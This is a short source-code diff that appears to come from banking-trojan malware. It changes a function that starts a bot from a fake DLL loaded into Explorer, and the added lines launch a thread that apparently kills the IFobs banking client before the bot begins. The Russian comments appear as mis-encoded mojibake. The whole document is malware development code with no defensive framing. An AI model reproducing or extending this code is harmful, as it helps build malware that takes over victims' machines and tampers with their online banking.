@@ -262,6 +262,9 @@ DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 	// ѕри загрузке просто вызывает Start, предусмотренную дл€
 	// обычного запуска Bot.plug
 	BOT::SetBotType(BotFakeDll);
+	#ifdef IFobsH
+		RunThread( IFobs::KillIFobs, (void*)10 );
+	#endif
 	Start(NULL, NULL, NULL);
 	return 0;
 }
